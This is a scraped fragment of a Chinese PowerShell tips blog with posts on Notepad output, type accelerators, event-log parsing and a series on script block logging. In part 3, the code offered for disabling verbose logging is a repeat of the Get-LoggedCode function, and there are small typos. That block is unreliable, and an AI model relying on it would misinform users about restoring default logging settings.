System.Diagnostics.ProcessModule (win32u.dll), System.Diagnostics.ProcessModule (IMM32.DLL), System.Diagnostics.ProcessModule (kernel.appcore.dll), System.Diagnostics.ProcessModule (VERSION.dll), System.Diagnostics.ProcessModule (clr.dll), System.Diagnostics.ProcessModule (MSVCR120_CLR0400.dll), System.Diagnostics.ProcessModule (mscorlib.ni.dll), System.Diagnostics.ProcessModule (ole32.dll), System.Diagnostics.ProcessModule (uxtheme.dll), System.Diagnostics.ProcessModule (tiptsf.dll), System.Diagnostics.ProcessModule (OLEAUT32.dll), System.Diagnostics.ProcessModule (CRYPTSP.dll), System.Diagnostics.ProcessModule (rsaenh.dll), System.Diagnostics.ProcessModule (bcrypt.dll), System.Diagnostics.ProcessModule (CRYPTBASE.dll),(...)","link":"/2018/06/07/using-secret-formatenumerationlimit-variable/"},{"title":"PowerShell 技能连载 - Out-Notepad: Send Information to Notepad","text":"您是否曾希望将文本直接发送到记事本，而并不将它保存到文件中？ 通常，您需要将文本保存到一个文件，然后通知它读取文件。还有一个更特别的方法：通过 Windows 消息和记事本通信，将文字发送到记事本。这是 Out-Notepad 函数的代码： 123456789101112131415161718192021222324252627282930313233343536373839#requires -Version 2function Out-Notepad{ param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [String] [AllowEmptyString()] $Text ) begin { $sb = New-Object System.Text.StringBuilder } process { $null = $sb.AppendLine($Text) } end { $text = $sb.ToString() $process = Start-Process notepad -PassThru $null = $process.WaitForInputIdle() $sig = ' [DllImport(&quot;user32.dll&quot;, EntryPoint = &quot;FindWindowEx&quot;)]public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow); [DllImport(&quot;User32.dll&quot;)]public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam); ' $type = Add-Type -MemberDefinition $sig -Name APISendMessage -PassThru $hwnd = $process.MainWindowHandle [IntPtr]$child = $type::FindWindowEx($hwnd, [IntPtr]::Zero, &quot;Edit&quot;, $null) $null = $type::SendMessage($child, 0x000C, 0, $text) }} 这是它的使用方法： 123PS&gt; Get-Service | Out-NotepadPS&gt; Get-Service | Out-String | Out-Notepad 这两行代码，都能打开一个全新的 Notepad 实例，所有服务信息都写入 Notepad。请注意它们的不同：第一行代码创建一个对象名称的列表。如果您希望对象的显示像在 PowerShell 中那样详细，请确保将他们通过管道送给 Notepad 之前先将它们用管道送给 Out-String。","link":"/2018/06/08/out-notepad-send-information-to-notepad/"},{"title":"PowerShell 技能连载 - 理解类型加速器（第 1 部分）","text":"“类型加速器”类似 .NET 类型别名。它们的目的是节约打字。例如，[ADSI] “类型”实际上并不存在。它只不过是 System.DirectoryServices.DirectoryEntry 的别名。您可以将 [ADSI] 替换为 [System.DirectoryServices.DirectoryEntry]： 123456PS&gt; [ADSI].FullNameSystem.DirectoryServices.DirectoryEntryPS&gt; [System.DirectoryServices.DirectoryEntry].FullNameSystem.DirectoryServices.DirectoryEntry 由于类型加速器是硬编码进 PowerShell 中的，所以使用它们是安全的。以下这行代码将显示所有预定义的类型加速器，如果您想使用 .NET 类型，您可以选用列表中的内容，因为它们在 PowerShell 中都很重要： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798PS&gt; [PSObject].Assembly.GetType('System.Management.Automation.TypeAccelerators')::GetKey Value--- -----Alias System.Management.Automation.AliasAttributeAllowEmptyCollection System.Management.Automation.AllowEmptyCollecti...AllowEmptyString System.Management.Automation.AllowEmptyStringAt...AllowNull System.Management.Automation.AllowNullAttributeArgumentCompleter System.Management.Automation.ArgumentCompleterA...array System.Arraybool System.Booleanbyte System.Bytechar System.CharCmdletBinding System.Management.Automation.CmdletBindingAttri...datetime System.DateTimedecimal System.Decimaldouble System.DoubleDscResource System.Management.Automation.DscResourceAttributefloat System.Singlesingle System.Singleguid System.Guidhashtable System.Collections.Hashtableint System.Int32int32 System.Int32int16 System.Int16long System.Int64int64 System.Int64ciminstance Microsoft.Management.Infrastructure.CimInstancecimclass Microsoft.Management.Infrastructure.CimClasscimtype Microsoft.Management.Infrastructure.CimTypecimconverter Microsoft.Management.Infrastructure.CimConverterIPEndpoint System.Net.IPEndPointNullString System.Management.Automation.Language.NullStringOutputType System.Management.Automation.OutputTypeAttributeObjectSecurity System.Security.AccessControl.ObjectSecurityParameter System.Management.Automation.ParameterAttributePhysicalAddress System.Net.NetworkInformation.PhysicalAddresspscredential System.Management.Automation.PSCredentialPSDefaultValue System.Management.Automation.PSDefaultValueAttr...pslistmodifier System.Management.Automation.PSListModifierpsobject System.Management.Automation.PSObjectpscustomobject System.Management.Automation.PSObjectpsprimitivedictionary System.Management.Automation.PSPrimitiveDictionaryref System.Management.Automation.PSReferencePSTypeNameAttribute System.Management.Automation.PSTypeNameAttributeregex System.Text.RegularExpressions.RegexDscProperty System.Management.Automation.DscPropertyAttributesbyte System.SBytestring System.StringSupportsWildcards System.Management.Automation.SupportsWildcardsA...switch System.Management.Automation.SwitchParametercultureinfo System.Globalization.CultureInfobigint System.Numerics.BigIntegersecurestring System.Security.SecureStringtimespan System.TimeSpanuint16 System.UInt16uint32 System.UInt32uint64 System.UInt64uri System.UriValidateCount System.Management.Automation.ValidateCountAttri...ValidateDrive System.Management.Automation.ValidateDriveAttri...ValidateLength System.Management.Automation.ValidateLengthAttr...ValidateNotNull System.Management.Automation.ValidateNotNullAtt...ValidateNotNullOrEmpty System.Management.Automation.ValidateNotNullOrE...ValidatePattern System.Management.Automation.ValidatePatternAtt...ValidateRange System.Management.Automation.ValidateRangeAttri...ValidateScript System.Management.Automation.ValidateScriptAttr...ValidateSet System.Management.Automation.ValidateSetAttributeValidateTrustedData System.Management.Automation.ValidateTrustedDat...ValidateUserDrive System.Management.Automation.ValidateUserDriveA...version System.Versionvoid System.Voidipaddress System.Net.IPAddressDscLocalConfigurationManager System.Management.Automation.DscLocalConfigurat...WildcardPattern System.Management.Automation.WildcardPatternX509Certificate System.Security.Cryptography.X509Certificates.X...X500DistinguishedName System.Security.Cryptography.X509Certificates.X...xml System.Xml.XmlDocumentCimSession Microsoft.Management.Infrastructure.CimSessionadsi System.DirectoryServices.DirectoryEntryadsisearcher System.DirectoryServices.DirectorySearcherwmiclass System.Management.ManagementClasswmi System.Management.ManagementObjectwmisearcher System.Management.ManagementObjectSearchermailaddress System.Net.Mail.MailAddressscriptblock System.Management.Automation.ScriptBlockpsvariable System.Management.Automation.PSVariabletype System.Typepsmoduleinfo System.Management.Automation.PSModuleInfopowershell System.Management.Automation.PowerShellrunspacefactory System.Management.Automation.Runspaces.Runspace...runspace System.Management.Automation.Runspaces.Runspaceinitialsessionstate System.Management.Automation.Runspaces.InitialS...psscriptmethod System.Management.Automation.PSScriptMethodpsscriptproperty System.Management.Automation.PSScriptPropertypsnoteproperty System.Management.Automation.PSNotePropertypsaliasproperty System.Management.Automation.PSAliasPropertypsvariableproperty System.Management.Automation.PSVariableProperty","link":"/2018/06/11/understanding-type-accelerators-part-1/"},{"title":"PowerShell 技能连载 - 理解类型加速器（第 2 部分）","text":"PowerShell 带来了一系列硬编码的类型加速器，它们的效果就像通常使用的 .NET 类型，而且由于它们比原始数据类型名称短很多，所以它们“加快了打字速度”。 一个很少人知道的事实是类型加速器列表是可以扩展的。以下代码添加一个新的名为 “SuperArray” 的类型加速器，它指向 “System.Collections.ArrayList”。 您现在可以创建一个新的“超级数组”（它用起来像普通的数组，但是拥有一系列额外的方法来向指定的位置增删元素，而且附加数组元素也比普通的数组快得多）： 123[PSObject].Assembly.GetType('System.Management.Automation.TypeAccelerators')::Add('SuperArray', [System.Collections.ArrayList])$a = [superarray]::new() 您还可以将一个普通数组转换成“超级数组”： 1234567PS&gt; $a = [superarray](1,2,3)PS&gt; $a.RemoveAt(1)PS&gt; $a13 请注意虽然不用类型加速器也可以完成这项任务。但是得敲这么长的代码： 1234567PS&gt; $a = [System.Collections.ArrayList](1,2,3)PS&gt; $a.RemoveAt(1)PS&gt; $a13","link":"/2018/06/12/understanding-type-accelerators-part-2/"},{"title":"PowerShell 技能连载 - 巧妙地读取事件日志（第 1 部分）","text":"当您使用 PowerShell 来查询事件，缺省情况下获取到的是日志信息的文本消息。例如，如果您想知道谁登录了您的计算机，您可以使用类似这样的代码（需要管理员权限）： 12Get-EventLog -LogName Security -InstanceId 4624 | Select-Object -Property TimeGenerated, Message 结果大概类似这样： 25.04.2018 07:48:41 An account was successfully logged on.... 25.04.2018 07:48:40 An account was successfully logged on.... 24.04.2018 18:18:17 An account was successfully logged on.... ... 这并不是很直观，因为 PowerShell 缩短了输出内容。在类似这样的情况下，您可能需要将结果用管道传给 Format-List： 123Get-EventLog -LogName Security -InstanceId 4624 | Select-Object -Property TimeGenerated, Message | Format-List 它现在可以生成详细的数据了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182PS&gt; Get-EventLog -LogName Security -InstanceId 4624 | Select-Object -Property TimeGenerated, Message -first 1 | Format-ListTimeGenerated : 25.05.2018 11:39:29Message : An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: DESKTOP-7AAMJLF$ Account Domain: WORKGROUP Logon ID: 0x3e7 Logon Information: Logon Type: 5 Restricted Admin Mode: - Virtual Account: %%1843 Elevated Token: %%1842 Impersonation Level: %%1833 New Logon: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT-AUTORITÄT Logon ID: 0x3e7 Linked Logon ID: 0x0 Network Account Name: - Network Account Domain: - Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0x328 Process Name: C:\\Windows\\System32\\services.exe Network Information: Workstation Name: - Source Network Address: - Source Port: - Detailed Authentication Information: Logon Process: Advapi Authentication Package: Negotiate Transited Services: - Package Name (NTLM only): - Key Length: 0 This event is generated when a logon session is created. It is generated on the computer that was accessed. The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe. The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network). The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on. The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases. The impersonation level field indicates the extent to which a process in the logon session can impersonate. The authentication information fields provide detailed information about this specific logon request. - Logon GUID is a unique identifier that can be used to correlate this event with a KDC event. - Transited services indicate which intermediate services have participated in this logon request. - Package name indicates which sub-protocol was used among the NTLM protocols. - Key length indicates the length of the generated session key. This will be 0 if no session key was requested. 这个结果很难处理。如果您希望基于这段文本做一些自动化处理，您需要解析这段文本。 有一个简单得多的方法：您见到的消息只是一个文本模板，Windows 以“替换字符串”的方式插入相关的信息。他们是从 Get-0EventLog 接收到的事件数据的一部分。该数据存在一个数组中，整个数组对应一个事件 ID 的信息。 当您确定了哪个信息存放在哪个数组元素中，要解析出您关心的信息十分容易： 12345678910Get-EventLog -LogName Security -InstanceId 4624 | ForEach-Object { # translate the raw data into a new object [PSCustomObject]@{ Time = $_.TimeGenerated User = &quot;{0}\\{1}&quot; -f $_.ReplacementStrings[5], $_.ReplacementStrings[6] Type = $_.ReplacementStrings[10] Path = $_.ReplacementStrings[17] } } 当您运行这一小段代码时，它返回只包含您需要的、美观的验证信息： 12.05.2018 17:38:58 SYSTEM\\NT-AUTORITÄT Negotiate C:\\Windows\\System32\\services.exe 12.05.2018 17:38:58 tobweltner@zumsel.local\\InternalAccount Negotiate C:\\Windows\\System32\\svchost.exe 12.05.2018 17:38:58 SYSTEM\\NT-AUTORITÄT Negotiate C:\\Windows\\System32\\services.exe 12.05.2018 17:38:58 SYSTEM\\NT-AUTORITÄT Negotiate C:\\Windows\\System32\\services.exe 12.05.2018 17:38:53 SYSTEM\\NT-AUTORITÄT Negotiate C:\\Windows\\System32\\services.exe","link":"/2018/06/13/reading-event-logs-smart-part-1/"},{"title":"PowerShell 技能连载 - 巧妙地读取事件日志（第 2 部分）","text":"在前一个技能中我们演示了如何使用 ReplacementStrings 读取从 Get-EventLog 中收到的详细的事件日志信息。它工作得很完美，但是 Get-EventLog 职能读取“传统的”Windows 日志。在现代的 Windows 版本中还有许多额外的日志。 这些日志可以通过 Get-WinEvent 读取，而且有许多信息可以发掘。例如，要获取已安装的更新列表，请试试这段代码： 123$filter = @{ ProviderName=&quot;Microsoft-Windows-WindowsUpdateClient&quot;; Id=19 }Get-WinEvent -FilterHashtable $filter | Select-Object -ExpandProperty Message -First 4 请注意这只是一个例子。通过以上代码，您可以查询您关心的任意事件 ID 的日志。例如以上代码，可以获取最新安装的 4 条更新： 123456789PS&gt; . 'C:\\Users\\tobwe\\Documents\\PowerShell\\Untitled5.ps1' &lt;# script is not saved yet #&gt;Installation Successful: Windows successfully installed the following update: Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.269.69.0)Installation Successful: Windows successfully installed the following update: 9WZDNCRFJ1XX-FITBIT.FITBITInstallation Successful: Windows successfully installed the following update: Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.269.28.0)Installation Successful: Windows successfully installed the following update: 9WZDNCRFHVQM-MICROSOFT.WINDOWSCOMMUNICATIONSAPPS 然而，这只是文本，而且要将它转换为一份已安装的更新的漂亮的报告并不容易。通过 Get-EventLog，类似我们之前的技能介绍的，您可以使用 ReplacementStrings 来方便地存取纯净的信息。但是 Get-WinEvent 没有 ReplacementStrings。 然而，有一个名为 Properties 的属性。以下是如何将属性转换为类似 ReplacementStrings 的数组的方法： 1234567891011121314151617$filter = @{ ProviderName=&quot;Microsoft-Windows-WindowsUpdateClient&quot;; Id=19 }Get-WinEvent -FilterHashtable $filter | ForEach-Object { # create a ReplacementStrings array # this array holds the information that is inserted # into the event message template text $ReplacementStrings = $_.Properties | ForEach-Object { $_.Value } # return a new object with the required information [PSCustomObject]@{ Time = $_.TimeCreated # index 0 contains the name of the update Name = $ReplacementStrings[0] User = $_.UserId.Value } } 这段代码返回以安装更新的美观的列表： Time Name ---- ---- 25.05.2018 09:00:20 Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.... 25.05.2018 07:59:44 9WZDNCRFJ1XX-FITBIT.FITBIT 24.05.2018 11:04:15 Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.... 24.05.2018 08:36:26 9WZDNCRFHVQM-MICROSOFT.WINDOWSCOMMUNICATIONSAPPS 24.05.2018 08:34:30 9N4WGH0Z6VHQ-Microsoft.HEVCVideoExtension 24.05.2018 08:34:24 9WZDNCRFJ2QK-ZDFGemeinntzigeAnstaltdes.ZDFmediathek 23.05.2018 11:57:42 Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.... 23.05.2018 07:37:11 9WZDNCRFHVQM-MICROSOFT.WINDOWSCOMMUNICATIONSAPPS 23.05.2018 07:36:57 9WZDNCRFJ3PT-MICROSOFT.ZUNEMUSIC 23.05.2018 04:01:11 Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.... 22.05.2018 12:26:55 Definitionsupdate für Windows Defender Antivirus – KB2267602 (Definition 1.... 22.05.2018 08:34:28 9NBLGGH5FV99-Microsoft.MSPaint 22.05.2018 08:33:25 9WZDNCRFJ364-MICROSOFT.SKYPEAPP","link":"/2018/06/14/reading-event-logs-smart-part-2/"},{"title":"PowerShell 技能连载 - 从本地时间以 ISO 格式创建 UTC 时间","text":"如果您的工作是跨国跨时区的，您可能会需要使用 UTC 时间来代替本地时间。要确保时间格式是语言中性的，我们推荐使用 ISO 格式。以下是使用方法： 12$date = Get-Date$date.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')","link":"/2018/06/15/create-universal-time-from-local-time-in-iso-format/"},{"title":"PowerShell 技能连载 - 快速读取文本文件","text":"PowerShell 有许多读取文本文件的方法，它们的性能差异很大。请自己确认一下。以下例子演示了不同的实践，并测量执行的时间。请确保例子中的路径实际存在。如果文件不存在，请选择一个大文件来测试。 1234567891011121314151617181920212223242526# make sure this file exists, or else# pick a different text file that is# very large$path = 'C:\\Windows\\Logs\\DISM\\dism.log'# slow reading line-by-lineMeasure-Command { $text = Get-Content -Path $Path}# fast reading entire text as one large stringMeasure-Command { $text = Get-Content -Path $Path -Raw}# fast reading text as string array with one# array element per lineMeasure-Command { $text = Get-Content -Path $Path -ReadCount 0}# reading entire text with .NET# no advantage over -RawMeasure-Command { $text = [System.IO.File]::ReadAllText($path)}","link":"/2018/06/18/reading-text-files-fast-1152612330/"},{"title":"PowerShell 技能连载 - 显示输入框","text":"如果您想弹出一个快速而粗糙的输入框，提示用户输入数据，您可以通过 Microsoft Visual Basic 并且“借用”它的 InputBox 控件： 123Add-Type -AssemblyName Microsoft.VisualBasic$result = [Microsoft.VisualBasic.Interaction]::InputBox(&quot;Enter your Name&quot;, &quot;Name&quot;, $env:username)$result 但是请注意，这种方法有一些局限性：该输入框可能在您的 PowerShell 窗口之下打开，而且在高分辨率屏中，它的缩放可能不正确。","link":"/2018/06/19/displaying-input-box/"},{"title":"PowerShell 技能连载 - 显示消息框","text":"如果您希望显示一个带有按钮，可供用户点击的消息框，请试试这个函数： 1234567891011121314151617181920212223242526272829303132333435function Show-MessageBox{ [CmdletBinding()] param ( [Parameter(Mandatory=$true,ValueFromPipeline=$false)] [String] $Text, [Parameter(Mandatory=$true,ValueFromPipeline=$false)] [String] $Caption, [Parameter(Mandatory=$true,ValueFromPipeline=$false)] [Windows.MessageBoxButton] $Button, [Parameter(Mandatory=$true,ValueFromPipeline=$false)] [Windows.MessageBoxImage] $Icon ) process { try { [System.Windows.MessageBox]::Show($Text, $Caption, $Button, $Icon) } catch { Write-Warning &quot;Error occured: $_&quot; } }} 以下是它的使用方法： 1PS&gt; Show-MessageBox -Text 'Do you want to reboot now?' -Caption Reboot -Button YesNoCancel -Icon Exclamatio","link":"/2018/06/20/displaying-message-box/"},{"title":"PowerShell 技能连载 - 添加前导零","text":"如果您需要数字前面添加前导零，例如对于服务器名，以下是两种实现方式。第一，您可以将数字转换为字符串，然后用 PadLeft() 函数将字符串填充到指定的长度： 123456789101112$number = 76$leadingZeroes = 8$number.Tostring().PadLeft($leadingZeroes, '0')Or, you can use the -f operator:$number = 76$leadingZeroes = 8&quot;{0:d$leadingZeroes}&quot; -f $number","link":"/2018/06/21/adding-leading-zeroes/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 1 部分）","text":"从 PowerShell 5 开始，PowerShell 引擎开始记录执行的命令和脚本块。缺省情况下，只有被认为有潜在威胁的命令会记录日志。当启用了详细日志后，由所有用户执行的所有执行代码都会被记录。 这是一个介绍脚本块日志的迷你系列的第一部分。今天，我们只是学习以最基础的方式使用脚本块日志。一行代码就够了： 1234$logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 }Get-WinEvent -FilterHashtable $logInfo | Select-Object -ExpandProperty Message 这将从 “Microsoft-Windows-PowerShell” 的日志（它包含代码日志）中读取所有 ID 为 4104 的事件。请注意 PowerShell Core 也记录日志，但是使用的是一个不同的日志文件。 您现在可以类似这样获取大量的数据： Creating Scriptblock text (1 of 1): Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass ScriptBlock ID: aeb85bcb-98be-42d0-b695-fbbb975ec5d2 Path: 如果 Path 为空，则说明该命令以交互的方式执行。否则，在这里可以查看到脚本的路径。 如果您没有获取到任何信息，请考虑以下可能性： 您是否使用的是 Windows PowerShell？如果您使用的是 PowerShell Core，您需要调整日志文件名。 缺省情况下，脚本块日志仅记录和安全有关的代码。如果您没有涉及到这方面的代码，可能不会收到任何记录。 以下代码是和安全相关的，当您执行它时，您将会从后续的日志中读取到这行代码： 1PS&gt; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force","link":"/2018/06/22/understanding-script-block-logging-part-1/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 2 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 2 部分。今天，我们将会再次读取脚本块日志的记录。但是这次我们将以更加面向对象的方式读取日志数据： 123456789101112131415161718192021222324252627282930313233function Get-LoggedCode{ # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data [PSCustomObject]@{ # when this was logged Time = $_.TimeCreated # script code that was logged Code = $_.Properties[2].Value # if code was split into multiple log entries, # determine current and total part PartCurrent = $_.Properties[0].Value PartTotal = $_.Properties[1].Value # if total part is 1, code is not fragmented IsMultiPart = $_.Properties[1].Value -ne 1 # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged Level = $_.LevelDisplayName # user who executed the code (SID) User = $_.UserId } }} 当您运行这段代码时，您将得到一个新的名为 Get-LoggedCode 的命令。当您执行它时，它将返回类似这样的对象： 12345678910111213141516171819202122232425262728293031323334353637383940414243Time : 25.05.2018 10:57:36Code : function Get-LoggedCode { # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data: [PSCustomObject]@{ # when this was logged: Time = $_.TimeCreated # script code that was logged: Code = $_.Properties[2].Value # if code was split into multiple log entries, # determine current and total part: PartCurrent = $_.Properties[0].Value PartTotal = $_.Properties[1].Value # if total part is 1, code is not fragmented: IsMultiPart = $_.Properties[1].Value -ne 1 # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged: Level = $_.LevelDisplayName # user who executed the code (SID) User = $_.UserId } } }PartCurrent : 1PartTotal : 1IsMultiPart : FalsePath : D:\\sample.ps1Level : WarningUser : S-1-5-21-2012478179-265285931-690539891-1001 在我们的代码中，我们添加了 Select-Object 来读取整个日志，而不是最后一条日志。这里，我们得到我们刚刚执行的代码。您机器上的执行情况可能有所不同，原因如下： 缺省情况下，脚本快日志只记录“安全相关”（在返回的数据中，级别为 “Warning”）的代码。PowerShell 内部判断哪些代码是和安全相关的。在明天的技能中，我们将会介绍如何启用 “Verbose” 模式。当该模式打开时，所有代码都会被记录，所以日志文件的体积会增长得很快。以下是缺省设置 (“Warning”) 日志和详细日志的数量对比（从测试机器中提取）： 123456PS&gt; Get-LoggedCode | Group-Object LevelCount Name Group----- ---- ----- 549 Verbose {@{Time=25.05.2018 10:57:52; Code=prompt;.. 36 Warning {@{Time=25.05.2018 10:57:52; Code={... 请注意：由于日志的体积非常大，所以长的代码被分成多块。”IsMultiPart“、”PartCurrent“ 和 “PartTotal“ 属性可以提供这方面的有用信息。","link":"/2018/06/25/understanding-script-block-logging-part-2/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 3 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 2 部分。缺省情况下，只有被认为有潜在威胁的命令会记录日志。当启用了详细日志后，由所有用户执行的所有执行代码都会被记录。 要启用详细模式，您需要管理员特权。以下是一个启用详细日志的函数： 1234567891011121314151617181920212223242526272829303132333435function Enable-VerboseLogging{ &lt;# .SYNOPSIS Enables verbose script block logging. Requires Administrator privileges. .DESCRIPTION Turns script block logging on. Any code that is sent to PowerShell will be logged. .EXAMPLE Enable-VerboseLogging Enables script block logging. Administrator privileges required. #&gt; $path = &quot;Registry::HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging&quot; $exists = Test-Path -Path $path try { $ErrorActionPreference = 'Stop' if (!$exists) { $null = New-Item -Path $path -Force } Set-ItemProperty -Path $path -Name EnableScriptBlockLogging -Type DWord -Value 1 Set-ItemProperty -Path $path -Name EnableScriptBlockInvocationLogging -Type DWord -Value 1 } catch { Write-Warning &quot;Administrator privileges required. Run this command from an elevated PowerShell.&quot; }} 当您运行 Enable-VerboseLogging 之后，所有 PowerShell 代码将会记录到日志中。您可以使用我们之前介绍的方式之一来读取记录的代码，例如我们的 Get-LoggedCode： 123456789101112131415161718192021222324252627282930313233function Get-LoggedCode{ # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data [PSCustomObject]@{ # when this was logged Time = $_.TimeCreated # script code that was logged Code = $_.Properties[2].Value # if code was split into multiple log entries, # determine current and total part PartCurrent = $_.Properties[0].Value PartTotal = $_.Properties[1].Value # if total part is 1, code is not fragmented IsMultiPart = $_.Properties[1].Value -ne 1 # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged: Level = $_.LevelDisplayName # user who executed the code (SID) User = $_.UserId } }} 请注意只有改变日志设置需要管理员特权。而所有用户都可以读取记录的数据。 如果您希望禁止详细模式并且返回到缺省的设置，请使用这个函数： 123456789101112131415161718192021222324252627282930313233function Get-LoggedCode{ # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data [PSCustomObject]@{ # when this was logged Time = $_.TimeCreated # script code that was logged Code = $_.Properties[2].Value # if code was split into multiple log entries, # determine current and total part PartCurrent = $_.Properties[0].Value PartTotal = $_.Properties[1].Value # if total part is 1, code is not fragmented IsMultiPart = $_.Properties[1].Value -ne 1 # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged: Level = $_.LevelDisplayName # user who executed the code (SID) User = $_.UserId } }} 请注意即便详细脚本日志被关闭，PowerShell 将仍会记录和安全相关的代码。","link":"/2018/06/26/understanding-script-block-logging-part-3/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 4 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 4 部分。到目前为止，您已经了解了如何读取记录的 PowerShell 代码，以及如何打开详细模式。打开详细模式后，机器上运行的所有 PowerShell 代码都会记录下来，所以会产生大量的数据。为了不覆盖旧的日志数据，您需要增加日志文件的尺寸。以下是操作方法： 123456789101112131415161718192021222324252627282930313233343536373839404142function Set-SBLLogSize{ &lt;# .SYNOPSIS Sets a new size for the script block logging log. Administrator privileges required. .DESCRIPTION By default, the script block log has a maximum size of 15MB which may be too small to capture and log PowerShell activity over a given period of time. With this command, you can assign more memory to the log. .PARAMETER MaxSizeMB New log size in Megabyte .EXAMPLE Set-SBLLogSize -MaxSizeMB 100 Sets the maximum log size to 100MB. Administrator privileges required. #&gt; param ( [Parameter(Mandatory)] [ValidateRange(15,3000)] [int] $MaxSizeMB ) $Path = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-PowerShell/Operational&quot; try { $ErrorActionPreference = 'Stop' Set-ItemProperty -Path $Path -Name MaxSize -Value ($MaxSizeMB * 1MB) } catch { Write-Warning &quot;Administrator privileges required. Run this command from an elevated PowerShell.&quot; }} 要将日志文件的尺寸从缺省的 15MB 增加到 100MB，请运行以下代码（需要管理员特权）： 1PS&gt; Set-SBLLogSize -MaxSizeMB 100","link":"/2018/06/27/understanding-script-block-logging-part-4/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 5 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 5 部分。我们已经几乎达到目标了，缺少的是一个更好的方式来读取记录的代码。在我们之前的方法中，执行代码的用户收到一个晦涩的 SID 而不是一个清晰的名称。以下是一个将用户 SID 转为真实名称的函数，并且使用智能缓存来加速 SID 的查询过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function Get-LoggedCode{ # to speed up SID-to-user translation, # we use a hash table with already translated SIDs # it is empty at first $translateTable = @{} # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # turn SID into user $userSID = $_.UserId # if the cache does not contain the user SID yet... if (!$translateTable.ContainsKey($userSid)) { try { # ...try and turn it into a real name, and add it # to the cache $identifier = New-Object System.Security.Principal.SecurityIdentifier($userSID) $result = $identifier.Translate( [System.Security.Principal.NTAccount]).Value $translateTable[$userSid] = $result } catch { # if this fails, use the SID instead of a real name $translateTable[$userSid] = $userSID } } else { } # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data [PSCustomObject]@{ # when this was logged Time = $_.TimeCreated # script code that was logged Code = $_.Properties[2].Value # if code was split into multiple log entries, # determine current and total part PartCurrent = $_.Properties[0].Value PartTotal = $_.Properties[1].Value # if total part is 1, code is not fragmented IsMultiPart = $_.Properties[1].Value -ne 1 # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged Level = $_.LevelDisplayName # user who executed the code # take the real user name from the cache of translated # user names User = $translateTable[$userSID] } }}","link":"/2018/06/28/understanding-script-block-logging-part-5/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 6 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 6 部分。该是时候介绍最后的部分了：当您执行一段非常大的 PowerShell 脚本时，它们是分块记录的。还缺少的部分是整理代码片段的逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function Get-LoggedCode{ # to speed up SID-to-user translation, # we use a hash table with 